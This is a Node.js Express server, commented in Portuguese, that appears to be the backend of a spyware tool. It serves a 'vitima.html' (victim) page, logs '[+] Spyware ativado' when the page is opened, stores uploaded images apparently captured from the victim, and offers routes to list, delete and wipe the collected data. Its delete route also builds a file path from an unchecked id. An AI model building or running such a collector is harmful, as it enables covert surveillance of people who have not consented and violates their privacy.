"use strict";

const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs-extra");
const app = express();
const port = process.env.PORT || 3030;


// Configuração do armazenamento com Multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "data/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + path.extname(file.originalname)); // Adiciona timestamp ao nome do arquivo
  },
});

const upload = multer({ storage: storage });

// Middleware para logar acessos a arquivos estáticos específicos
app.use('/vitima.html', (req, res, next) => {
    console.log("[+] Spyware ativado");
    next();
});

// Servir arquivos estáticos
app.use(express.static("public"));
app.use("/data", express.static("data"));

// Rota para receber o upload
app.post("/upload", upload.single("image"), (req, res) => {
    console.log("[+] Imagem recebida")
    const baseUrl = `${req.protocol}://${req.get("host")}`;
  res.send({ imagePath: `${baseUrl}/data/${req.file.filename}` });
});


// Rota para listar todas as imagens
app.get("/images", async (req, res) => {
  try {
    const baseUrl = `${req.protocol}://${req.get("host")}`;
    const files = await fs.readdir("data/");
    const images = files.map((file, index) => ({ index: index, id: file, path: `${baseUrl}/data/${file}` }));
    res.json(images);
  } catch (error) {
    console.error("[-] Erro ao listar dados:", error);
    res.status(500).send("Erro ao listar imagens.");
  }
});

// Rota para excluir uma imagem
app.post("/delete/:id", async (req, res) => {
    const { id } = req.params;
    console.log(`[+] Foto ${id} foi apagada`);
    
    try {
      const filePath = `data/${id}`;
      await fs.unlink(filePath);
      console.log(`[+] Imagem ${id} excluída com sucesso.`);
      res.send(`Imagem excluída com sucesso.`);
    } catch (error) {
      console.error("[-] Erro ao apagar imagem:", error);
      res.status(500).send(`Erro ao apagar imagem.`);
    }
  });
  
  // Rota para excluir todos os dados
  app.post("/apagarDados", async (req, res) => {
      console.log("[+] Iniciou a tentativa de apagar os dados")
      try {
        await fs.emptyDir("data/");
        console.error("[+] Todos os dados foram apagados");
        res.send(`Dados apagados com sucesso.`);
      } catch (error) {
        console.error("[-] Erro ao apagar dados:", error);
        res.status(500).send("Erro ao apagar dados.");
      }
  });
  
  

// Iniciar o servidor
app.listen(port, () => {
  console.log(`[*] Servidor rodando em http://localhost:${port}`);
});
